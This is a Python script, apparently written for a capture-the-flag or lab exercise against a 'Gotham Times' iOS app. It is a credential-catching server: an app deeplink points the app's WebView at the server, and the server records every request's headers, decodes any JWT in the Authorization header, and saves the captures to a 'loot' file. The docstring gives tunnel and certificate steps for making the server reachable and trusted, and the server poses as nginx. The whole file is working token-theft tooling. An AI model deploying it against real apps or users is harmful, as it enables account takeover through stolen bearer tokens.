#!/usr/bin/env python3
"""
Header catcher for the Gotham Times deeplink lab.

Logs every request's headers, highlights Authorization / flag, decodes the JWT
payload, and appends hits to loot.jsonl. Point the app's WebView at this server
(gothamtimes://open?url=<this server's https URL>) and the leaked headers land here.

Two ways to get a trusted TLS endpoint (WKWebView enforces ATS, so plain http
will be refused):

  1) Tunnel (easiest, publicly trusted cert):
       python3 catcher.py --port 8000
       cloudflared tunnel --url http://localhost:8000     # or: ngrok http 8000
     Use the printed https://...trycloudflare.com / ngrok URL as the url= value.

  2) Direct TLS with your own cert (the device must trust it):
       python3 catcher.py --port 8443 --cert cert.pem --key key.pem
       python3 catcher.py --port 8443 --selfsigned --host 192.168.1.50
     A self-signed cert only works if you install it on the device and turn on
     full trust (Settings > General > About > Certificate Trust Settings).
     Without that, the TLS handshake aborts and no headers are ever sent.
"""
import argparse
import base64
import datetime
import json
import ssl
import subprocess
import sys
import tempfile
import urllib.parse
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

RED, GRN, YLW, DIM, RST = "\033[31m", "\033[32m", "\033[33m", "\033[2m", "\033[0m"
LOOT_FILE = "loot.jsonl"
INTERESTING = {"authorization", "flag"}


def b64url_json(segment):
    pad = "=" * (-len(segment) % 4)
    return json.loads(base64.urlsafe_b64decode(segment + pad))


def decode_jwt(token):
    parts = token.split(".")
    if len(parts) != 3:
        return None
    try:
        return {"header": b64url_json(parts[0]), "payload": b64url_json(parts[1])}
    except Exception:
        return None


class Handler(BaseHTTPRequestHandler):
    server_version = "nginx"
    sys_version = ""

    def log_message(self, fmt, *args):
        pass  # replaced by our own logging below

    def _dump(self):
        now = datetime.datetime.now().strftime("%H:%M:%S")
        print(f"\n{DIM}{'='*64}{RST}")
        print(f"{GRN}[{now}] {self.command} {self.path}{RST}")
        print(f"{DIM}from {self.client_address[0]}:{self.client_address[1]}{RST}")

        headers = {}
        for key, val in self.headers.items():
            headers[key] = val
            low = key.lower()
            if low in INTERESTING:
                print(f"  {RED}{key}: {val}{RST}")
                if low == "authorization":
                    token = val.split(" ", 1)[-1].strip()
                    jwt = decode_jwt(token)
                    if jwt:
                        print(f"  {YLW}  JWT header:  {json.dumps(jwt['header'])}{RST}")
                        print(f"  {YLW}  JWT payload: {json.dumps(jwt['payload'])}{RST}")
            else:
                print(f"  {DIM}{key}: {val}{RST}")

        body = b""
        length = int(self.headers.get("Content-Length", 0) or 0)
        if length:
            body = self.rfile.read(length)
            print(f"  {DIM}body: {body[:500]!r}{RST}")

        record = {
            "time": datetime.datetime.now().isoformat(),
            "client": self.client_address[0],
            "method": self.command,
            "path": self.path,
            "headers": headers,
            "body": body.decode("utf-8", "replace"),
        }
        with open(LOOT_FILE, "a") as fh:
            fh.write(json.dumps(record) + "\n")

        if any(h.lower() in INTERESTING for h in headers):
            print(f"{GRN}  >> captured. appended to {LOOT_FILE}{RST}")

    def _reply(self):
        payload = b'{"status":"ok"}'
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(payload)))
        self.end_headers()
        self.wfile.write(payload)

    def do_GET(self):
        self._dump()
        self._reply()

    def do_POST(self):
        self._dump()
        self._reply()

    do_PUT = do_POST
    do_HEAD = do_GET


def make_selfsigned(host):
    """Generate an in-memory self-signed cert/key pair via openssl."""
    certf = tempfile.NamedTemporaryFile(suffix=".pem", delete=False)
    keyf = tempfile.NamedTemporaryFile(suffix=".pem", delete=False)
    certf.close()
    keyf.close()
    subprocess.run(
        [
            "openssl", "req", "-x509", "-newkey", "rsa:2048", "-nodes",
            "-keyout", keyf.name, "-out", certf.name, "-days", "7",
            "-subj", f"/CN={host}",
            "-addext", f"subjectAltName=DNS:{host},IP:{host}",
        ],
        check=True,
    )
    return certf.name, keyf.name


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="0.0.0.0", help="bind address / SAN for selfsigned")
    ap.add_argument("--port", type=int, default=8000)
    ap.add_argument("--cert", help="PEM cert for direct TLS")
    ap.add_argument("--key", help="PEM key for direct TLS")
    ap.add_argument("--selfsigned", action="store_true", help="generate a throwaway cert")
    args = ap.parse_args()

    httpd = ThreadingHTTPServer((args.host, args.port), Handler)

    scheme = "http"
    cert, key = args.cert, args.key
    if args.selfsigned and not cert:
        cert, key = make_selfsigned(args.host if args.host != "0.0.0.0" else "localhost")
    if cert and key:
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ctx.load_cert_chain(cert, key)
        httpd.socket = ctx.wrap_socket(httpd.socket, server_side=True)
        scheme = "https"

    print(f"{GRN}catcher listening on {scheme}://{args.host}:{args.port}{RST}")
    print(f"{DIM}loot -> {LOOT_FILE}{RST}")
    if scheme == "http":
        print(f"{YLW}note: plain http. Put a tunnel (cloudflared/ngrok) in front for a trusted https URL.{RST}")
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print(f"\n{DIM}bye{RST}")
        sys.exit(0)


if __name__ == "__main__":
    main()
